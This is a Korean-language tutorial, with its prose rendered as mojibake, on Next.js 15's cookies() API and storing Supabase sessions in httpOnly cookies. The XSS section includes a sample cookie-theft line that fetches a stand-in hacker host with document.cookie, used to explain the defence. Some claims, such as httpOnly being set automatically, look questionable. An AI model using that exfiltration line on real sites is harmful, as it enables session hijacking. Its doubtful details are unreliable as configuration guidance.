 # Next.js 15ì˜ cookies() APIì™€ httpOnly ì¿ í‚¤ ì„¤ì •

  ğŸª cookies() APIì˜ ì—­í• 

  1. Next.js 15ì˜ cookies() APIë€?

  Next.js 15ì—ì„œ ì œê³µí•˜ëŠ” ì„œë²„ ì‚¬ì´ë“œ ì¿ í‚¤ ê´€ë¦¬ APIì…ë‹ˆë‹¤.

  import { cookies } from 'next/headers'

  // Server Component, Server Action, Route Handlerì—ì„œë§Œ ì‚¬ìš© ê°€ëŠ¥
  const cookieStore = await cookies()

  ì£¼ìš” íŠ¹ì§•:
  - âœ… ì„œë²„ì—ì„œë§Œ ì‹¤í–‰ (ë³´ì•ˆ)
  - âœ… async í•¨ìˆ˜ (Next.js 15ë¶€í„° ë¹„ë™ê¸°)
  - âœ… httpOnly ì¿ í‚¤ ì ‘ê·¼ ê°€ëŠ¥
  - âŒ Client Componentì—ì„œ ì‚¬ìš© ë¶ˆê°€

  2. cookies() API ë©”ì„œë“œ

  const cookieStore = await cookies()

  // ì¿ í‚¤ ì½ê¸°
  cookieStore.get('name')           // ë‹¨ì¼ ì¿ í‚¤
  cookieStore.getAll()              // ëª¨ë“  ì¿ í‚¤

  // ì¿ í‚¤ ì“°ê¸°
  cookieStore.set('name', 'value', options)

  // ì¿ í‚¤ ì‚­ì œ
  cookieStore.delete('name')

  ---
  ğŸ” httpOnly ì¿ í‚¤ë€?

  1. httpOnly ì¿ í‚¤ì˜ ê°œë…

  ì¼ë°˜ ì¿ í‚¤:
  // JavaScriptë¡œ ì ‘ê·¼ ê°€ëŠ¥ (ìœ„í—˜!)
  document.cookie = "token=abc123"
  console.log(document.cookie) // "token=abc123" ì¶œë ¥ë¨

  httpOnly ì¿ í‚¤:
  // JavaScriptë¡œ ì ‘ê·¼ ë¶ˆê°€ (ì•ˆì „!)
  console.log(document.cookie) // httpOnly ì¿ í‚¤ëŠ” ì•ˆ ë³´ì„

  2. ì™œ httpOnlyê°€ ì¤‘ìš”í•œê°€?

  XSS ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:
  <!-- ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì£¼ì…ëœ ê²½ìš° -->
  <script>
    // ì¼ë°˜ ì¿ í‚¤: íƒˆì·¨ ê°€ëŠ¥ ğŸ˜±
    fetch('https://hacker.com/steal?cookie=' + document.cookie)

    // httpOnly ì¿ í‚¤: ì ‘ê·¼ ë¶ˆê°€ âœ…
    // document.cookieì— ì•ˆ ë³´ì„!
  </script>

  ë³´ì•ˆ ë¹„êµ:
  | ì¿ í‚¤ íƒ€ì…    | JavaScript ì ‘ê·¼ | XSS ê³µê²© ì‹œ |
  |----------|---------------|----------|
  | ì¼ë°˜ ì¿ í‚¤    | âœ… ê°€ëŠ¥          | âŒ íƒˆì·¨ë¨    |
  | httpOnly | âŒ ë¶ˆê°€          | âœ… ì•ˆì „     |

  ---
  ğŸ”§ Supabase Server í´ë¼ì´ì–¸íŠ¸ì—ì„œì˜ êµ¬í˜„

  1. ì „ì²´ ì½”ë“œ êµ¬ì¡°

  // src/lib/supabase/server.ts
  import { createServerClient } from '@supabase/ssr'
  import { cookies } from 'next/headers'

  export async function createClient() {
    const cookieStore = await cookies()

    return createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
      {
        cookies: {
          // ì—­í•  1: ì¿ í‚¤ ì½ê¸°
          getAll() {
            return cookieStore.getAll()
          },

          // ì—­í•  2: ì¿ í‚¤ ì“°ê¸° (httpOnly í¬í•¨)
          setAll(cookiesToSet) {
            try {
              cookiesToSet.forEach(({ name, value, options }) =>
                cookieStore.set(name, value, options)
              )
            } catch {
              // Server Componentì—ì„œëŠ” ì¿ í‚¤ ì„¤ì • ë¶ˆê°€ (ì½ê¸° ì „ìš©)
              // Server Action, Route Handlerì—ì„œë§Œ ê°€ëŠ¥
            }
          },
        },
      }
    )
  }

  2. ê° ë¶€ë¶„ì˜ ì—­í•  ìƒì„¸ ì„¤ëª…

  A. getAll() - ì¿ í‚¤ ì½ê¸°

  getAll() {
    return cookieStore.getAll()
  }

  ì—­í• :
  - Supabase ì„¸ì…˜ í† í°ì„ ì¿ í‚¤ì—ì„œ ì½ê¸°
  - ì‚¬ìš©ì ë¡œê·¸ì¸ ìƒíƒœ í™•ì¸
  - Server Componentì—ì„œ ë°ì´í„° fetch ì‹œ ì‚¬ìš©

  ì‹¤ì œ ë™ì‘:
  // Supabaseê°€ ë‚´ë¶€ì ìœ¼ë¡œ ì´ë ‡ê²Œ ì‚¬ìš©
  const session = getAll().find(c => c.name === 'sb-access-token')

  B. setAll() - ì¿ í‚¤ ì“°ê¸° (httpOnly ì„¤ì •)

  setAll(cookiesToSet) {
    cookiesToSet.forEach(({ name, value, options }) =>
      cookieStore.set(name, value, options)
    )
  }

  ì—­í• :
  - ë¡œê·¸ì¸ ì‹œ ì„¸ì…˜ í† í°ì„ httpOnly ì¿ í‚¤ë¡œ ì €ì¥
  - refresh token ê°±ì‹ 
  - ë¡œê·¸ì•„ì›ƒ ì‹œ ì¿ í‚¤ ì‚­ì œ

  options ë§¤ê°œë³€ìˆ˜:
  {
    name: 'sb-access-token',
    value: 'eyJhbGci...',
    options: {
      httpOnly: true,      // JavaScript ì ‘ê·¼ ì°¨ë‹¨ âœ…
      secure: true,        // HTTPSë§Œ ì „ì†¡
      sameSite: 'lax',     // CSRF ë°©ì–´
      maxAge: 604800,      // 7ì¼
      path: '/'
    }
  }

  3. try-catchì˜ ì´ìœ 

  try {
    cookiesToSet.forEach(...)
  } catch {
    // Server Componentì—ì„œëŠ” ì—ëŸ¬ ë°œìƒ
  }

  Next.js 15 ì œì•½ì‚¬í•­:
  - âœ… Server Action: ì¿ í‚¤ ì½ê¸° + ì“°ê¸° ê°€ëŠ¥
  - âœ… Route Handler: ì¿ í‚¤ ì½ê¸° + ì“°ê¸° ê°€ëŠ¥
  - âŒ Server Component: ì¿ í‚¤ ì½ê¸°ë§Œ ê°€ëŠ¥ (ì“°ê¸° ë¶ˆê°€)

  ì™œ ì½ê¸°ë§Œ?
  - Server ComponentëŠ” ë Œë”ë§ë§Œ ë‹´ë‹¹
  - ë¶€ì‘ìš©(side effect) ê¸ˆì§€
  - ì¿ í‚¤ ì“°ê¸°ëŠ” Server Actionì—ì„œë§Œ

  ---
  ğŸ“‹ ì‹¤ì œ ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤

  ì‹œë‚˜ë¦¬ì˜¤ 1: ë¡œê·¸ì¸ (ì¿ í‚¤ ì“°ê¸°)

  // app/actions/auth.ts (Server Action)
  'use server'

  import { createClient } from '@/lib/supabase/server'
  import { redirect } from 'next/navigation'

  export async function login(formData: FormData) {
    const supabase = await createClient()

    // ë¡œê·¸ì¸ ì‹œë„
    const { error } = await supabase.auth.signInWithPassword({
      email: formData.get('email') as string,
      password: formData.get('password') as string,
    })

    // ë‚´ë¶€ì ìœ¼ë¡œ setAll()ì´ í˜¸ì¶œë˜ì–´ httpOnly ì¿ í‚¤ì— ì €ì¥ë¨
    // sb-access-token: { httpOnly: true, secure: true, ... }

    if (error) return { error: error.message }

    redirect('/dashboard')
  }

  ì¿ í‚¤ ì €ì¥ íë¦„:
  1. signInWithPassword() í˜¸ì¶œ
  2. Supabaseê°€ í† í° ìƒì„±
  3. setAll() í˜¸ì¶œ
  4. cookieStore.set() ì‹¤í–‰
  5. httpOnly ì¿ í‚¤ì— ì €ì¥ âœ…

  ì‹œë‚˜ë¦¬ì˜¤ 2: ì„¸ì…˜ í™•ì¸ (ì¿ í‚¤ ì½ê¸°)

  // app/dashboard/page.tsx (Server Component)
  import { createClient } from '@/lib/supabase/server'
  import { redirect } from 'next/navigation'

  export default async function DashboardPage() {
    const supabase = await createClient()

    // ë‚´ë¶€ì ìœ¼ë¡œ getAll()ì´ í˜¸ì¶œë˜ì–´ ì¿ í‚¤ì—ì„œ ì„¸ì…˜ ì½ìŒ
    const { data: { user } } = await supabase.auth.getUser()

    if (!user) {
      redirect('/login')
    }

    return <div>Welcome {user.email}</div>
  }

  ì¿ í‚¤ ì½ê¸° íë¦„:
  1. getUser() í˜¸ì¶œ
  2. getAll() ì‹¤í–‰
  3. sb-access-token ì¿ í‚¤ ì°¾ê¸°
  4. í† í° ê²€ì¦
  5. ì‚¬ìš©ì ì •ë³´ ë°˜í™˜

  ì‹œë‚˜ë¦¬ì˜¤ 3: ë¡œê·¸ì•„ì›ƒ (ì¿ í‚¤ ì‚­ì œ)

  // app/actions/auth.ts
  'use server'

  export async function logout() {
    const supabase = await createClient()

    await supabase.auth.signOut()
    // ë‚´ë¶€ì ìœ¼ë¡œ setAll()ì´ í˜¸ì¶œë˜ì–´ ì¿ í‚¤ ì‚­ì œ

    redirect('/login')
  }

  ---
  ğŸ” ë³´ì•ˆ ì´ì  ì •ë¦¬

  1. httpOnly ì¿ í‚¤ì˜ ë³´ì•ˆ

  // âŒ ì¼ë°˜ ì¿ í‚¤ (localStorage ë“±)
  localStorage.setItem('token', 'abc123')
  // XSS ê³µê²© ì‹œ: íƒˆì·¨ ê°€ëŠ¥!

  // âœ… httpOnly ì¿ í‚¤
  cookieStore.set('token', 'abc123', { httpOnly: true })
  // XSS ê³µê²© ì‹œ: document.cookieë¡œ ì ‘ê·¼ ë¶ˆê°€!

  2. ì¶”ê°€ ë³´ì•ˆ ì˜µì…˜

  options: {
    httpOnly: true,     // XSS ë°©ì–´
    secure: true,       // HTTPSë§Œ ì „ì†¡ (ì¤‘ê°„ì ê³µê²© ë°©ì–´)
    sameSite: 'lax',    // CSRF ë°©ì–´
    path: '/',          // ì „ì²´ ê²½ë¡œì—ì„œ ì ‘ê·¼
    maxAge: 604800,     // 7ì¼ í›„ ìë™ ì‚­ì œ
  }

  ---
  ğŸ“Œ ì •ë¦¬

  cookies() APIì˜ ì—­í• :
  1. âœ… ì„œë²„ì—ì„œ ì¿ í‚¤ ì½ê¸°/ì“°ê¸°
  2. âœ… httpOnly ì¿ í‚¤ ê´€ë¦¬
  3. âœ… Next.js 15 App Routerì™€ í†µí•©

  httpOnly ì¿ í‚¤ì˜ ì—­í• :
  1. âœ… JavaScript ì ‘ê·¼ ì°¨ë‹¨ â†’ XSS ë°©ì–´
  2. âœ… HTTPSë§Œ ì „ì†¡ â†’ ì¤‘ê°„ì ê³µê²© ë°©ì–´
  3. âœ… SameSite â†’ CSRF ë°©ì–´

  êµ¬í˜„ ë°©ë²•:
  1. cookies() APIë¡œ ì¿ í‚¤ ìŠ¤í† ì–´ ê°€ì ¸ì˜¤ê¸°
  2. getAll()ë¡œ ì½ê¸°
  3. setAll()ë¡œ ì“°ê¸° (httpOnly ìë™ ì„¤ì •)
  4. Server Actionì—ì„œë§Œ ì¿ í‚¤ ì“°ê¸° ê°€ëŠ¥

  ì´ë ‡ê²Œ í•˜ë©´ Supabase ì„¸ì…˜ì´ ì•ˆì „í•˜ê²Œ httpOnly ì¿ í‚¤ë¡œ ê´€ë¦¬ë©ë‹ˆë‹¤! ğŸ”’
